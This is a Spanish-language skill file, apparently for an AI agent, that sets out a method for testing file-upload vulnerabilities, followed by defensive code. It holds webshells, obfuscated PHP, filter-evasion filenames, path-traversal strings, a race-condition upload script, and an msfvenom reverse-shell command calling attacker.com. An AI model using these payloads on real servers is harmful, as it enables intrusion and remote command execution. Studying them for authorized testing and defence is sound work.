---
name: file-upload-testing
description: Habilidades profesionales y metodología para pruebas de vulnerabilidades de carga de archivos
version: 1.0.0
---

# Pruebas de vulnerabilidades de carga de archivos

## Descripción general

La función de carga de archivos es común en aplicaciones web, pero presenta múltiples riesgos de seguridad. Esta habilidad proporciona métodos para la detección, explotación y protección de vulnerabilidades de carga de archivos.

## Tipos de vulnerabilidades

### 1. Tipo de archivo no validado

**Validación solo en frontend:**
```javascript
// Puede ser evadido
if (!file.name.endsWith('.jpg')) {
  alert('Solo se permite cargar imágenes');
}
```

### 2. Contenido del archivo no validado

**Solo comprueba la extensión:**
```php
// Código peligroso
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Salto de directorio

**Nombre de archivo no filtrado:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Sobrescritura de nombre de archivo

**Nombres de archivo predecibles:**
```
uploads/1.jpg
uploads/2.jpg
```

## Métodos de prueba

### 1. Detección básica

**Probar varios tipos de archivos:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Probar doble extensión:**
```
shell.php.jpg
shell.jpg.php
```

**Probar mayúsculas y minúsculas:**
```
shell.PHP
shell.PhP
```

### 2. Evasión de tipo de contenido

**Modificar Content-Type:**
```
Content-Type: image/jpeg
# Pero el contenido del archivo es código PHP
```

**Magic Bytes:**
```php
// Añadir cabecera de imagen antes del código PHP
GIF89a<?php phpinfo(); ?>
```

### 3. Vulnerabilidades de análisis

**Vulnerabilidad de análisis de Apache:**
```
shell.php.xxx  # Apache podría analizarlo como PHP
```

**Vulnerabilidad de análisis de IIS:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Vulnerabilidad de análisis de Nginx:**
```
shell.jpg%00.php
```

### 4. Condición de carrera

**Acceder inmediatamente después de cargar el archivo:**
```python
# Cargar archivo .php, acceder después de que se complete la carga pero antes de que se elimine
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Técnicas de explotación

### PHP WebShell

**WebShell básico:**
```php
<?php system($_GET['cmd']); ?>
```

**Troyano de una línea:**
```php
<?php eval($_POST['a']); ?>
```

**Evasión de filtros:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Uso: ?cmd=system
```

### Explotación de .htaccess

**Cargar .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Luego cargar shell.jpg (en realidad es código PHP)**

### Troyano en imagen

**Troyano en imagen GIF:**
```php
GIF89a
<?php
phpinfo();
?>
```

**Troyano en imagen PNG:**
```bash
# Usar herramienta para incrustar código PHP en PNG
python3 png2php.py shell.php shell.png
```

### Combinación con inclusión de archivos

**Si existe vulnerabilidad de inclusión de archivos:**
```
# Cargar imagen que contiene código PHP
# Luego ejecutar mediante inclusión de archivos
?file=uploads/shell.jpg
```

## Técnicas de evasión

### Evasión de extensión

**Doble extensión:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Mayúsculas y minúsculas:**
```
shell.PHP
shell.PhP
```

**Caracteres especiales:**
```
shell.php.
shell.php 
shell.php%20
```

### Evasión de Content-Type

**Modificar cabecera de solicitud:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Evasión de Magic Bytes

**Añadir cabecera de archivo:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Ofuscación de código

**Usar etiquetas cortas:**
```php
<?= system($_GET['cmd']); ?>
```

**Usar variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Uso de herramientas

### Burp Suite

1. Interceptar solicitud de carga de archivos
2. Modificar nombre de archivo y contenido
3. Probar varias técnicas de evasión

### Upload Bypass

```bash
# Probar carga de archivos usando varias técnicas
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### Generación de WebShell

```bash
# Generar varios WebShells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se puede cargar un archivo malicioso
2. Verificar que el archivo se puede ejecutar
3. Evaluar el impacto (ejecución de comandos, fuga de datos, etc.)
4. Registrar la PoC completa

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y función de carga
- Tipos de archivos que se pueden cargar y método de ejecución
- Pasos completos de explotación y PoC
- Sugerencias de reparación (validación de tipo de archivo, comprobación de contenido, almacenamiento seguro, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Lista blanca de tipos de archivos**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **Validación de contenido del archivo**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Renombrar archivo**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Almacenamiento aislado**
   - Almacenar archivos fuera del directorio raíz web
   - Acceder a través de un script proxy
   - Deshabilitar permisos de ejecución

5. **Escaneo de archivos**
   - Usar software antivirus para escanear
   - Comprobar el contenido del archivo
   - Eliminar permisos de ejecución

6. **Límite de tamaño**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Evitar cargar archivos maliciosos en entornos de producción
- Limpiar oportunamente después de las pruebas
- Prestar atención a las diferencias de análisis de los distintos servidores